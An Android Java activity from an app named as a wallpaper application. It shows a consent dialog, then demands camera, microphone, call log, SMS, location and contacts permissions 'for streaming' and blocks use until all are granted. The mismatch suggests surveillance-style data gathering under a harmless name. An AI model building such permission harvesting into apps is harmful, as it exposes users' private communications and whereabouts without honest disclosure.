package com.example.wallpaperapplication;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.widget.Toast;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.preference.PreferenceManager;

public class ConsentActivity extends AppCompatActivity {
    private static final int PERMISSIONS_REQUEST = 1001;

    private String[] getRequiredPermissions() {
        java.util.List<String> perms = new java.util.ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.READ_CONTACTS);
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        return perms.toArray(new String[0]);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        boolean consentGiven = prefs.getBoolean("consent_given", false);
        if (!consentGiven) {
            showConsentDialog();
        } else {
            checkPermissionsOrFinish();
        }
    }

    private void showConsentDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Consent Required")
                .setMessage(R.string.consent_text)
                .setCancelable(false)
                .setPositiveButton("I Agree", (dialog, which) -> {
                    PreferenceManager
                            .getDefaultSharedPreferences(this)
                            .edit()
                            .putBoolean("consent_given", true)
                            .apply();
                    checkPermissionsOrFinish();
                })
                .setNegativeButton("Cancel", (dialog, which) -> {
                    Toast.makeText(this,
                            "You must agree to proceed",
                            Toast.LENGTH_LONG).show();
                    finish();
                })
                .show();
    }

    private void checkPermissionsOrFinish() {
        String[] requiredPermissions = getRequiredPermissions();
        // if any permission is missing, request them
        boolean missing = false;
        for (String perm: requiredPermissions) {
            if (ActivityCompat.checkSelfPermission(this, perm)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                missing = true;
                break;
            }
        }

        if (missing) {
            ActivityCompat.requestPermissions(
                    this,
                    requiredPermissions,
                    PERMISSIONS_REQUEST
            );
        } else {
            // all set! return to MainActivity
            startActivity(new Intent(this, MainActivity.class));
            finish();
        }
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode, String[] permissions, int[] grantResults
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST) {
            boolean allGranted = true;
            for (int r: grantResults) {
                if (r != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                startActivity(new Intent(this, MainActivity.class));
            } else {
                Toast.makeText(this,
                        "Permissions are required for streaming",
                        Toast.LENGTH_LONG).show();
            }
            finish();
        }
    }
}